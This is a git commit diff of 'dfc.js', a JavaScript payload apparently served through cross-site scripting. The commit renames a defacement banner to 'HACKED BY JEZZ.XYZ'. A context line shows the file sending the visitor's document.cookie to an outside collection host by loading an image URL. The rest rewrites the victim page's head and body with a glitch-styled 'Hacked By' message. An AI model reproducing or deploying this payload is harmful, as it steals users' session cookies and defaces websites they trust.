7e4e2af8d7a31f1e70f393ef307f1d528677eb90
Sat? <140927620+JezzXyz@users.noreply.github.com>
2025-04-25 21:03:01 +0700

    Update dfc.js

--- dfc.js
+++ dfc.js
@@ -2,7 +2,7 @@ new Image().src = "https://mpsshh.bxss.in" + encodeURIComponent(document.cookie)
 
 document.head.innerHTML = `
   <meta charset="UTF-8">
-  <title>sasuga lord j</title>
+  <title>HACKED BY JEZZ.XYZ</title>
   <meta name="description" content="whopz!">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
   <link rel="stylesheet" href="https://rawcdn.githack.com/nako48/shiraookaaaa/f37b3bb82ba199ac8df3a394d8652e56872935a9/style-css.css">
@@ -36,7 +36,7 @@ document.body.innerHTML = `
   <div class="centered">
     <div class="glitch-wrapper">
       <div class="glitch" data-text="leave me,i want alone">
-        Hacked By J.Xyzz<br>[!] UNKNOWN [!]
+        Hacked By Jezz.Xyzz<br>[!] UNKNOWN [!]
       </div>
     </div>
     <iframe src="about:blank" frameborder="0" width="1" height="1"></iframe>
